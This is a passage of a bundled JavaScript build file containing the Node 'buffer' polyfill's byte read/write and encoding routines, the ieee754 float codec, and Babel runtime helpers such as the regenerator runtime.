            if (!noAssert) checkOffset(offset, 2, this.length);
            var val = this[offset] | this[offset + 1] << 8;
            return val & 0x8000 ? val | 0xFFFF0000 : val;
          };
          Buffer.prototype.readInt16BE = function readInt16BE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 2, this.length);
            var val = this[offset + 1] | this[offset] << 8;
            return val & 0x8000 ? val | 0xFFFF0000 : val;
          };
          Buffer.prototype.readInt32LE = function readInt32LE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 4, this.length);
            return this[offset] | this[offset + 1] << 8 | this[offset + 2] << 16 | this[offset + 3] << 24;
          };
          Buffer.prototype.readInt32BE = function readInt32BE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 4, this.length);
            return this[offset] << 24 | this[offset + 1] << 16 | this[offset + 2] << 8 | this[offset + 3];
          };
          Buffer.prototype.readFloatLE = function readFloatLE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 4, this.length);
            return ieee754.read(this, offset, true, 23, 4);
          };
          Buffer.prototype.readFloatBE = function readFloatBE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 4, this.length);
            return ieee754.read(this, offset, false, 23, 4);
          };
          Buffer.prototype.readDoubleLE = function readDoubleLE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 8, this.length);
            return ieee754.read(this, offset, true, 52, 8);
          };
          Buffer.prototype.readDoubleBE = function readDoubleBE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 8, this.length);
            return ieee754.read(this, offset, false, 52, 8);
          };
          function checkInt(buf, value, offset, ext, max, min) {
            if (!Buffer.isBuffer(buf)) throw new TypeError('"buffer" argument must be a Buffer instance');
            if (value > max || value < min) throw new RangeError('"value" argument is out of bounds');
            if (offset + ext > buf.length) throw new RangeError('Index out of range');
          }
          Buffer.prototype.writeUIntLE = function writeUIntLE(value, offset, byteLength, noAssert) {
            value = +value;
            offset = offset >>> 0;
            byteLength = byteLength >>> 0;
            if (!noAssert) {
              var maxBytes = Math.pow(2, 8 * byteLength) - 1;
              checkInt(this, value, offset, byteLength, maxBytes, 0);
            }
            var mul = 1;
            var i = 0;
            this[offset] = value & 0xFF;
            while (++i < byteLength && (mul *= 0x100)) {
              this[offset + i] = value / mul & 0xFF;
            }
            return offset + byteLength;
          };
          Buffer.prototype.writeUIntBE = function writeUIntBE(value, offset, byteLength, noAssert) {
            value = +value;
            offset = offset >>> 0;
            byteLength = byteLength >>> 0;
            if (!noAssert) {
              var maxBytes = Math.pow(2, 8 * byteLength) - 1;
              checkInt(this, value, offset, byteLength, maxBytes, 0);
            }
            var i = byteLength - 1;
            var mul = 1;
            this[offset + i] = value & 0xFF;
            while (--i >= 0 && (mul *= 0x100)) {
              this[offset + i] = value / mul & 0xFF;
            }
            return offset + byteLength;
          };
          Buffer.prototype.writeUInt8 = function writeUInt8(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 1, 0xff, 0);
            this[offset] = value & 0xff;
            return offset + 1;
          };
          Buffer.prototype.writeUInt16LE = function writeUInt16LE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0);
            this[offset] = value & 0xff;
            this[offset + 1] = value >>> 8;
            return offset + 2;
          };
          Buffer.prototype.writeUInt16BE = function writeUInt16BE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0);
            this[offset] = value >>> 8;
            this[offset + 1] = value & 0xff;
            return offset + 2;
          };
          Buffer.prototype.writeUInt32LE = function writeUInt32LE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0);
            this[offset + 3] = value >>> 24;
            this[offset + 2] = value >>> 16;
            this[offset + 1] = value >>> 8;
            this[offset] = value & 0xff;
            return offset + 4;
          };
          Buffer.prototype.writeUInt32BE = function writeUInt32BE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0);
            this[offset] = value >>> 24;
            this[offset + 1] = value >>> 16;
            this[offset + 2] = value >>> 8;
            this[offset + 3] = value & 0xff;
            return offset + 4;
          };
          Buffer.prototype.writeIntLE = function writeIntLE(value, offset, byteLength, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) {
              var limit = Math.pow(2, 8 * byteLength - 1);
              checkInt(this, value, offset, byteLength, limit - 1, -limit);
            }
            var i = 0;
            var mul = 1;
            var sub = 0;
            this[offset] = value & 0xFF;
            while (++i < byteLength && (mul *= 0x100)) {
              if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {
                sub = 1;
              }
              this[offset + i] = (value / mul >> 0) - sub & 0xFF;
            }
            return offset + byteLength;
          };
          Buffer.prototype.writeIntBE = function writeIntBE(value, offset, byteLength, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) {
              var limit = Math.pow(2, 8 * byteLength - 1);
              checkInt(this, value, offset, byteLength, limit - 1, -limit);
            }
            var i = byteLength - 1;
            var mul = 1;
            var sub = 0;
            this[offset + i] = value & 0xFF;
            while (--i >= 0 && (mul *= 0x100)) {
              if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {
                sub = 1;
              }
              this[offset + i] = (value / mul >> 0) - sub & 0xFF;
            }
            return offset + byteLength;
          };
          Buffer.prototype.writeInt8 = function writeInt8(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 1, 0x7f, -0x80);
            if (value < 0) value = 0xff + value + 1;
            this[offset] = value & 0xff;
            return offset + 1;
          };
          Buffer.prototype.writeInt16LE = function writeInt16LE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000);
            this[offset] = value & 0xff;
            this[offset + 1] = value >>> 8;
            return offset + 2;
          };
          Buffer.prototype.writeInt16BE = function writeInt16BE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000);
            this[offset] = value >>> 8;
            this[offset + 1] = value & 0xff;
            return offset + 2;
          };
          Buffer.prototype.writeInt32LE = function writeInt32LE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000);
            this[offset] = value & 0xff;
            this[offset + 1] = value >>> 8;
            this[offset + 2] = value >>> 16;
            this[offset + 3] = value >>> 24;
            return offset + 4;
          };
          Buffer.prototype.writeInt32BE = function writeInt32BE(value, offset, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000);
            if (value < 0) value = 0xffffffff + value + 1;
            this[offset] = value >>> 24;
            this[offset + 1] = value >>> 16;
            this[offset + 2] = value >>> 8;
            this[offset + 3] = value & 0xff;
            return offset + 4;
          };
          function checkIEEE754(buf, value, offset, ext, max, min) {
            if (offset + ext > buf.length) throw new RangeError('Index out of range');
            if (offset < 0) throw new RangeError('Index out of range');
          }
          function writeFloat(buf, value, offset, littleEndian, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) {
              checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38);
            }
            ieee754.write(buf, value, offset, littleEndian, 23, 4);
            return offset + 4;
          }
          Buffer.prototype.writeFloatLE = function writeFloatLE(value, offset, noAssert) {
            return writeFloat(this, value, offset, true, noAssert);
          };
          Buffer.prototype.writeFloatBE = function writeFloatBE(value, offset, noAssert) {
            return writeFloat(this, value, offset, false, noAssert);
          };
          function writeDouble(buf, value, offset, littleEndian, noAssert) {
            value = +value;
            offset = offset >>> 0;
            if (!noAssert) {
              checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308);
            }
            ieee754.write(buf, value, offset, littleEndian, 52, 8);
            return offset + 8;
          }
          Buffer.prototype.writeDoubleLE = function writeDoubleLE(value, offset, noAssert) {
            return writeDouble(this, value, offset, true, noAssert);
          };
          Buffer.prototype.writeDoubleBE = function writeDoubleBE(value, offset, noAssert) {
            return writeDouble(this, value, offset, false, noAssert);
          };
          Buffer.prototype.copy = function copy(target, targetStart, start, end) {
            if (!Buffer.isBuffer(target)) throw new TypeError('argument should be a Buffer');
            if (!start) start = 0;
            if (!end && end !== 0) end = this.length;
            if (targetStart >= target.length) targetStart = target.length;
            if (!targetStart) targetStart = 0;
            if (end > 0 && end < start) end = start;
            if (end === start) return 0;
            if (target.length === 0 || this.length === 0) return 0;
            if (targetStart < 0) {
              throw new RangeError('targetStart out of bounds');
            }
            if (start < 0 || start >= this.length) throw new RangeError('Index out of range');
            if (end < 0) throw new RangeError('sourceEnd out of bounds');
            if (end > this.length) end = this.length;
            if (target.length - targetStart < end - start) {
              end = target.length - targetStart + start;
            }
            var len = end - start;
            if (this === target && typeof Uint8Array.prototype.copyWithin === 'function') {
              this.copyWithin(targetStart, start, end);
            } else if (this === target && start < targetStart && targetStart < end) {
              for (var i = len - 1; i >= 0; --i) {
                target[i + targetStart] = this[i + start];
              }
            } else {
              Uint8Array.prototype.set.call(target, this.subarray(start, end), targetStart);
            }
            return len;
          };
          Buffer.prototype.fill = function fill(val, start, end, encoding) {
            if (typeof val === 'string') {
              if (typeof start === 'string') {
                encoding = start;
                start = 0;
                end = this.length;
              } else if (typeof end === 'string') {
                encoding = end;
                end = this.length;
              }
              if (encoding !== undefined && typeof encoding !== 'string') {
                throw new TypeError('encoding must be a string');
              }
              if (typeof encoding === 'string' && !Buffer.isEncoding(encoding)) {
                throw new TypeError('Unknown encoding: ' + encoding);
              }
              if (val.length === 1) {
                var code = val.charCodeAt(0);
                if (encoding === 'utf8' && code < 128 || encoding === 'latin1') {
                  val = code;
                }
              }
            } else if (typeof val === 'number') {
              val = val & 255;
            }
            if (start < 0 || this.length < start || this.length < end) {
              throw new RangeError('Out of range index');
            }
            if (end <= start) {
              return this;
            }
            start = start >>> 0;
            end = end === undefined ? this.length : end >>> 0;
            if (!val) val = 0;
            var i;
            if (typeof val === 'number') {
              for (i = start; i < end; ++i) {
                this[i] = val;
              }
            } else {
              var bytes = Buffer.isBuffer(val) ? val : Buffer.from(val, encoding);
              var len = bytes.length;
              if (len === 0) {
                throw new TypeError('The value "' + val + '" is invalid for argument "value"');
              }
              for (i = 0; i < end - start; ++i) {
                this[i + start] = bytes[i % len];
              }
            }
            return this;
          };
          var INVALID_BASE64_RE = /[^+/0-9A-Za-z-_]/g;
          function base64clean(str) {
            str = str.split('=')[0];
            str = str.trim().replace(INVALID_BASE64_RE, '');
            if (str.length < 2) return '';
            while (str.length % 4 !== 0) {
              str = str + '=';
            }
            return str;
          }
          function toHex(n) {
            if (n < 16) return '0' + n.toString(16);
            return n.toString(16);
          }
          function utf8ToBytes(string, units) {
            units = units || Infinity;
            var codePoint;
            var length = string.length;
            var leadSurrogate = null;
            var bytes = [];
            for (var i = 0; i < length; ++i) {
              codePoint = string.charCodeAt(i);
              if (codePoint > 0xD7FF && codePoint < 0xE000) {
                if (!leadSurrogate) {
                  if (codePoint > 0xDBFF) {
                    if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
                    continue;
                  } else if (i + 1 === length) {
                    if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
                    continue;
                  }
                  leadSurrogate = codePoint;
                  continue;
                }
                if (codePoint < 0xDC00) {
                  if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
                  leadSurrogate = codePoint;
                  continue;
                }
                codePoint = (leadSurrogate - 0xD800 << 10 | codePoint - 0xDC00) + 0x10000;
              } else if (leadSurrogate) {
                if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD);
              }
              leadSurrogate = null;
              if (codePoint < 0x80) {
                if ((units -= 1) < 0) break;
                bytes.push(codePoint);
              } else if (codePoint < 0x800) {
                if ((units -= 2) < 0) break;
                bytes.push(codePoint >> 0x6 | 0xC0, codePoint & 0x3F | 0x80);
              } else if (codePoint < 0x10000) {
                if ((units -= 3) < 0) break;
                bytes.push(codePoint >> 0xC | 0xE0, codePoint >> 0x6 & 0x3F | 0x80, codePoint & 0x3F | 0x80);
              } else if (codePoint < 0x110000) {
                if ((units -= 4) < 0) break;
                bytes.push(codePoint >> 0x12 | 0xF0, codePoint >> 0xC & 0x3F | 0x80, codePoint >> 0x6 & 0x3F | 0x80, codePoint & 0x3F | 0x80);
              } else {
                throw new Error('Invalid code point');
              }
            }
            return bytes;
          }
          function asciiToBytes(str) {
            var byteArray = [];
            for (var i = 0; i < str.length; ++i) {
              byteArray.push(str.charCodeAt(i) & 0xFF);
            }
            return byteArray;
          }
          function utf16leToBytes(str, units) {
            var c, hi, lo;
            var byteArray = [];
            for (var i = 0; i < str.length; ++i) {
              if ((units -= 2) < 0) break;
              c = str.charCodeAt(i);
              hi = c >> 8;
              lo = c % 256;
              byteArray.push(lo);
              byteArray.push(hi);
            }
            return byteArray;
          }
          function base64ToBytes(str) {
            return base64.toByteArray(base64clean(str));
          }
          function blitBuffer(src, dst, offset, length) {
            for (var i = 0; i < length; ++i) {
              if (i + offset >= dst.length || i >= src.length) break;
              dst[i + offset] = src[i];
            }
            return i;
          }
          function isInstance(obj, type) {
            return obj instanceof type || obj != null && obj.constructor != null && obj.constructor.name != null && obj.constructor.name === type.name;
          }
          function numberIsNaN(obj) {
            return obj !== obj;
          }
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "base64-js": 1,
      "buffer": 3,
      "ieee754": 4
    }],
    4: [function (require, module, exports) {
      exports.read = function (buffer, offset, isLE, mLen, nBytes) {
        var e, m;
        var eLen = nBytes * 8 - mLen - 1;
        var eMax = (1 << eLen) - 1;
        var eBias = eMax >> 1;
        var nBits = -7;
        var i = isLE ? nBytes - 1 : 0;
        var d = isLE ? -1 : 1;
        var s = buffer[offset + i];
        i += d;
        e = s & (1 << -nBits) - 1;
        s >>= -nBits;
        nBits += eLen;
        for (; nBits > 0; e = e * 256 + buffer[offset + i], i += d, nBits -= 8) {}
        m = e & (1 << -nBits) - 1;
        e >>= -nBits;
        nBits += mLen;
        for (; nBits > 0; m = m * 256 + buffer[offset + i], i += d, nBits -= 8) {}
        if (e === 0) {
          e = 1 - eBias;
        } else if (e === eMax) {
          return m ? NaN : (s ? -1 : 1) * Infinity;
        } else {
          m = m + Math.pow(2, mLen);
          e = e - eBias;
        }
        return (s ? -1 : 1) * m * Math.pow(2, e - mLen);
      };
      exports.write = function (buffer, value, offset, isLE, mLen, nBytes) {
        var e, m, c;
        var eLen = nBytes * 8 - mLen - 1;
        var eMax = (1 << eLen) - 1;
        var eBias = eMax >> 1;
        var rt = mLen === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0;
        var i = isLE ? 0 : nBytes - 1;
        var d = isLE ? 1 : -1;
        var s = value < 0 || value === 0 && 1 / value < 0 ? 1 : 0;
        value = Math.abs(value);
        if (isNaN(value) || value === Infinity) {
          m = isNaN(value) ? 1 : 0;
          e = eMax;
        } else {
          e = Math.floor(Math.log(value) / Math.LN2);
          if (value * (c = Math.pow(2, -e)) < 1) {
            e--;
            c *= 2;
          }
          if (e + eBias >= 1) {
            value += rt / c;
          } else {
            value += rt * Math.pow(2, 1 - eBias);
          }
          if (value * c >= 2) {
            e++;
            c /= 2;
          }
          if (e + eBias >= eMax) {
            m = 0;
            e = eMax;
          } else if (e + eBias >= 1) {
            m = (value * c - 1) * Math.pow(2, mLen);
            e = e + eBias;
          } else {
            m = value * Math.pow(2, eBias - 1) * Math.pow(2, mLen);
            e = 0;
          }
        }
        for (; mLen >= 8; buffer[offset + i] = m & 0xff, i += d, m /= 256, mLen -= 8) {}
        e = e << mLen | m;
        eLen += mLen;
        for (; eLen > 0; buffer[offset + i] = e & 0xff, i += d, e /= 256, eLen -= 8) {}
        buffer[offset + i - d] |= s * 128;
      };
    }, {}],
    5: [function (require, module, exports) {
      function _assertThisInitialized(self) {
        if (self === void 0) {
          throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        }
        return self;
      }
      module.exports = _assertThisInitialized, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    6: [function (require, module, exports) {
      function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
        try {
          var info = gen[key](arg);
          var value = info.value;
        } catch (error) {
          reject(error);
          return;
        }
        if (info.done) {
          resolve(value);
        } else {
          Promise.resolve(value).then(_next, _throw);
        }
      }
      function _asyncToGenerator(fn) {
        return function () {
          var self = this,
            args = arguments;
          return new Promise(function (resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
              asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
              asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
          });
        };
      }
      module.exports = _asyncToGenerator, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    7: [function (require, module, exports) {
      function _classCallCheck(instance, Constructor) {
        if (!(instance instanceof Constructor)) {
          throw new TypeError("Cannot call a class as a function");
        }
      }
      module.exports = _classCallCheck, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    8: [function (require, module, exports) {
      function _defineProperties(target, props) {
        for (var i = 0; i < props.length; i++) {
          var descriptor = props[i];
          descriptor.enumerable = descriptor.enumerable || false;
          descriptor.configurable = true;
          if ("value" in descriptor) descriptor.writable = true;
          Object.defineProperty(target, descriptor.key, descriptor);
        }
      }
      function _createClass(Constructor, protoProps, staticProps) {
        if (protoProps) _defineProperties(Constructor.prototype, protoProps);
        if (staticProps) _defineProperties(Constructor, staticProps);
        Object.defineProperty(Constructor, "prototype", {
          writable: false
        });
        return Constructor;
      }
      module.exports = _createClass, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    9: [function (require, module, exports) {
      function _getPrototypeOf(o) {
        module.exports = _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function _getPrototypeOf(o) {
          return o.__proto__ || Object.getPrototypeOf(o);
        }, module.exports.__esModule = true, module.exports["default"] = module.exports;
        return _getPrototypeOf(o);
      }
      module.exports = _getPrototypeOf, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    10: [function (require, module, exports) {
      var setPrototypeOf = require("./setPrototypeOf.js");
      function _inherits(subClass, superClass) {
        if (typeof superClass !== "function" && superClass !== null) {
          throw new TypeError("Super expression must either be null or a function");
        }
        subClass.prototype = Object.create(superClass && superClass.prototype, {
          constructor: {
            value: subClass,
            writable: true,
            configurable: true
          }
        });
        Object.defineProperty(subClass, "prototype", {
          writable: false
        });
        if (superClass) setPrototypeOf(subClass, superClass);
      }
      module.exports = _inherits, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {
      "./setPrototypeOf.js": 14
    }],
    11: [function (require, module, exports) {
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          "default": obj
        };
      }
      module.exports = _interopRequireDefault, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {}],
    12: [function (require, module, exports) {
      var _typeof = require("./typeof.js")["default"];
      var assertThisInitialized = require("./assertThisInitialized.js");
      function _possibleConstructorReturn(self, call) {
        if (call && (_typeof(call) === "object" || typeof call === "function")) {
          return call;
        } else if (call !== void 0) {
          throw new TypeError("Derived constructors may only return object or undefined");
        }
        return assertThisInitialized(self);
      }
      module.exports = _possibleConstructorReturn, module.exports.__esModule = true, module.exports["default"] = module.exports;
    }, {
      "./assertThisInitialized.js": 5,
      "./typeof.js": 15
    }],
    13: [function (require, module, exports) {
      var _typeof = require("./typeof.js")["default"];
      function _regeneratorRuntime() {
        "use strict";

        module.exports = _regeneratorRuntime = function _regeneratorRuntime() {
          return exports;
        }, module.exports.__esModule = true, module.exports["default"] = module.exports;
        var exports = {},
          Op = Object.prototype,
          hasOwn = Op.hasOwnProperty,
          defineProperty = Object.defineProperty || function (obj, key, desc) {
            obj[key] = desc.value;
          },
          $Symbol = "function" == typeof Symbol ? Symbol : {},
          iteratorSymbol = $Symbol.iterator || "@@iterator",
          asyncIteratorSymbol = $Symbol.asyncIterator || "@@asyncIterator",
          toStringTagSymbol = $Symbol.toStringTag || "@@toStringTag";
        function define(obj, key, value) {
          return Object.defineProperty(obj, key, {
            value: value,
            enumerable: !0,
            configurable: !0,
            writable: !0
          }), obj[key];
        }
        try {
          define({}, "");
        } catch (err) {
          define = function define(obj, key, value) {
            return obj[key] = value;
          };
        }
        function wrap(innerFn, outerFn, self, tryLocsList) {
          var protoGenerator = outerFn && outerFn.prototype instanceof Generator ? outerFn : Generator,
            generator = Object.create(protoGenerator.prototype),
            context = new Context(tryLocsList || []);
          return defineProperty(generator, "_invoke", {
            value: makeInvokeMethod(innerFn, self, context)
          }), generator;
        }
        function tryCatch(fn, obj, arg) {
          try {
            return {
              type: "normal",
              arg: fn.call(obj, arg)
            };
          } catch (err) {
            return {
              type: "throw",
              arg: err
            };
          }
        }
        exports.wrap = wrap;
        var ContinueSentinel = {};
        function Generator() {}
        function GeneratorFunction() {}
        function GeneratorFunctionPrototype() {}
        var IteratorPrototype = {};
        define(IteratorPrototype, iteratorSymbol, function () {
          return this;
        });
        var getProto = Object.getPrototypeOf,
          NativeIteratorPrototype = getProto && getProto(getProto(values([])));
        NativeIteratorPrototype && NativeIteratorPrototype !== Op && hasOwn.call(NativeIteratorPrototype, iteratorSymbol) && (IteratorPrototype = NativeIteratorPrototype);
        var Gp = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(IteratorPrototype);
        function defineIteratorMethods(prototype) {
          ["next", "throw", "return"].forEach(function (method) {
            define(prototype, method, function (arg) {
              return this._invoke(method, arg);
            });
          });
        }
        function AsyncIterator(generator, PromiseImpl) {
          function invoke(method, arg, resolve, reject) {
            var record = tryCatch(generator[method], generator, arg);
            if ("throw" !== record.type) {
              var result = record.arg,
                value = result.value;
              return value && "object" == _typeof(value) && hasOwn.call(value, "__await") ? PromiseImpl.resolve(value.__await).then(function (value) {
                invoke("next", value, resolve, reject);
              }, function (err) {
                invoke("throw", err, resolve, reject);
              }) : PromiseImpl.resolve(value).then(function (unwrapped) {
                result.value = unwrapped, resolve(result);
              }, function (error) {
                return invoke("throw", error, resolve, reject);
              });
            }
            reject(record.arg);
          }
          var previousPromise;
          defineProperty(this, "_invoke", {
            value: function value(method, arg) {
              function callInvokeWithMethodAndArg() {
                return new PromiseImpl(function (resolve, reject) {
                  invoke(method, arg, resolve, reject);
                });
              }
              return previousPromise = previousPromise ? previousPromise.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg();
            }
          });
        }
        function makeInvokeMethod(innerFn, self, context) {
          var state = "suspendedStart";
          return function (method, arg) {
            if ("executing" === state) throw new Error("Generator is already running");
            if ("completed" === state) {
              if ("throw" === method) throw arg;
              return doneResult();
            }
            for (context.method = method, context.arg = arg;;) {
              var delegate = context.delegate;
              if (delegate) {
                var delegateResult = maybeInvokeDelegate(delegate, context);
                if (delegateResult) {
                  if (delegateResult === ContinueSentinel) continue;
                  return delegateResult;
                }
              }
              if ("next" === context.method) context.sent = context._sent = context.arg;else if ("throw" === context.method) {
                if ("suspendedStart" === state) throw state = "completed", context.arg;
                context.dispatchException(context.arg);
              } else "return" === context.method && context.abrupt("return", context.arg);
              state = "executing";
              var record = tryCatch(innerFn, self, context);
              if ("normal" === record.type) {
                if (state = context.done ? "completed" : "suspendedYield", record.arg === ContinueSentinel) continue;
                return {
                  value: record.arg,
                  done: context.done
                };
              }
              "throw" === record.type && (state = "completed", context.method = "throw", context.arg = record.arg);
            }
          };
        }
        function maybeInvokeDelegate(delegate, context) {
          var method = delegate.iterator[context.method];
          if (undefined === method) {
            if (context.delegate = null, "throw" === context.method) {
              if (delegate.iterator["return"] && (context.method = "return", context.arg = undefined, maybeInvokeDelegate(delegate, context), "throw" === context.method)) return ContinueSentinel;
              context.method = "throw", context.arg = new TypeError("The iterator does not provide a 'throw' method");
            }
            return ContinueSentinel;
          }
          var record = tryCatch(method, delegate.iterator, context.arg);
          if ("throw" === record.type) return context.method = "throw", context.arg = record.arg, context.delegate = null, ContinueSentinel;
          var info = record.arg;
          return info ? info.done ? (context[delegate.resultName] = info.value, context.next = delegate.nextLoc, "return" !== context.method && (context.method = "next", context.arg = undefined), context.delegate = null, ContinueSentinel) : info : (context.method = "throw", context.arg = new TypeError("iterator result is not an object"), context.delegate = null, ContinueSentinel);
        }
        function pushTryEntry(locs) {
          var entry = {
            tryLoc: locs[0]
          };
          1 in locs && (entry.catchLoc = locs[1]), 2 in locs && (entry.finallyLoc = locs[2], entry.afterLoc = locs[3]), this.tryEntries.push(entry);
        }
        function resetTryEntry(entry) {
          var record = entry.completion || {};
          record.type = "normal", delete record.arg, entry.completion = record;
        }
        function Context(tryLocsList) {
          this.tryEntries = [{
            tryLoc: "root"
          }], tryLocsList.forEach(pushTryEntry, this), this.reset(!0);
        }
        function values(iterable) {
          if (iterable) {
            var iteratorMethod = iterable[iteratorSymbol];
            if (iteratorMethod) return iteratorMethod.call(iterable);
            if ("function" == typeof iterable.next) return iterable;
            if (!isNaN(iterable.length)) {
              var i = -1,
                next = function next() {
                  for (; ++i < iterable.length;) {
                    if (hasOwn.call(iterable, i)) return next.value = iterable[i], next.done = !1, next;
                  }
                  return next.value = undefined, next.done = !0, next;
                };
              return next.next = next;
            }
          }
          return {
            next: doneResult
          };
        }
        function doneResult() {
          return {
            value: undefined,
            done: !0
          };
        }
        return GeneratorFunction.prototype = GeneratorFunctionPrototype, defineProperty(Gp, "constructor", {
          value: GeneratorFunctionPrototype,
          configurable: !0
        }), defineProperty(GeneratorFunctionPrototype, "constructor", {
          value: GeneratorFunction,
          configurable: !0
        }), GeneratorFunction.displayName = define(GeneratorFunctionPrototype, toStringTagSymbol, "GeneratorFunction"), exports.isGeneratorFunction = function (genFun) {
          var ctor = "function" == typeof genFun && genFun.constructor;
          return !!ctor && (ctor === GeneratorFunction || "GeneratorFunction" === (ctor.displayName || ctor.name));
        }, exports.mark = function (genFun) {
          return Object.setPrototypeOf ? Object.setPrototypeOf(genFun, GeneratorFunctionPrototype) : (genFun.__proto__ = GeneratorFunctionPrototype, define(genFun, toStringTagSymbol, "GeneratorFunction")), genFun.prototype = Object.create(Gp), genFun;
        }, exports.awrap = function (arg) {
          return {
            __await: arg
          };
        }, defineIteratorMethods(AsyncIterator.prototype), define(AsyncIterator.prototype, asyncIteratorSymbol, function () {
          return this;
        }), exports.AsyncIterator = AsyncIterator, exports.async = function (innerFn, outerFn, self, tryLocsList, PromiseImpl) {
          void 0 === PromiseImpl && (PromiseImpl = Promise);
          var iter = new AsyncIterator(wrap(innerFn, outerFn, self, tryLocsList), PromiseImpl);
          return exports.isGeneratorFunction(outerFn) ? iter : iter.next().then(function (result) {
            return result.done ? result.value : iter.next();
          });
        }, defineIteratorMethods(Gp), define(Gp, toStringTagSymbol, "Generator"), define(Gp, iteratorSymbol, function () {
          return this;
        }), define(Gp, "toString", function () {
          return "[object Generator]";
        }), exports.keys = function (val) {
          var object = Object(val),
            keys = [];
          for (var key in object) {
            keys.push(key);
          }
          return keys.reverse(), function next() {
            for (; keys.length;) {
              var key = keys.pop();
              if (key in object) return next.value = key, next.done = !1, next;
            }
            return next.done = !0, next;
          };
        }, exports.values = values, Context.prototype = {
          constructor: Context,
          reset: function reset(skipTempReset) {
            if (this.prev = 0, this.next = 0, this.sent = this._sent = undefined, this.done = !1, this.delegate = null, this.method = "next", this.arg = undefined, this.tryEntries.forEach(resetTryEntry), !skipTempReset) for (var name in this) {
              "t" === name.charAt(0) && hasOwn.call(this, name) && !isNaN(+name.slice(1)) && (this[name] = undefined);
            }
          },
          stop: function stop() {
            this.done = !0;
            var rootRecord = this.tryEntries[0].completion;
            if ("throw" === rootRecord.type) throw rootRecord.arg;
            return this.rval;
          },
          dispatchException: function dispatchException(exception) {
            if (this.done) throw exception;
            var context = this;
            function handle(loc, caught) {
              return record.type = "throw", record.arg = exception, context.next = loc, caught && (context.method = "next", context.arg = undefined), !!caught;
            }
            for (var i = this.tryEntries.length - 1; i >= 0; --i) {
              var entry = this.tryEntries[i],
                record = entry.completion;
              if ("root" === entry.tryLoc) return handle("end");
              if (entry.tryLoc <= this.prev) {
                var hasCatch = hasOwn.call(entry, "catchLoc"),
                  hasFinally = hasOwn.call(entry, "finallyLoc");
                if (hasCatch && hasFinally) {
                  if (this.prev < entry.catchLoc) return handle(entry.catchLoc, !0);
                  if (this.prev < entry.finallyLoc) return handle(entry.finallyLoc);
                } else if (hasCatch) {
                  if (this.prev < entry.catchLoc) return handle(entry.catchLoc, !0);
                } else {
                  if (!hasFinally) throw new Error("try statement without catch or finally");
                  if (this.prev < entry.finallyLoc) return handle(entry.finallyLoc);
                }
              }
            }
          },
          abrupt: function abrupt(type, arg) {
            for (var i = this.tryEntries.length - 1; i >= 0; --i) {
              var entry = this.tryEntries[i];
              if (entry.tryLoc <= this.prev && hasOwn.call(entry, "finallyLoc") && this.prev < entry.finallyLoc) {
                var finallyEntry = entry;
                break;
              }
            }
            finallyEntry && ("break" === type || "continue" === type) && finallyEntry.tryLoc <= arg && arg <= finallyEntry.finallyLoc && (finallyEntry = null);
            var record = finallyEntry ? finallyEntry.completion : {};
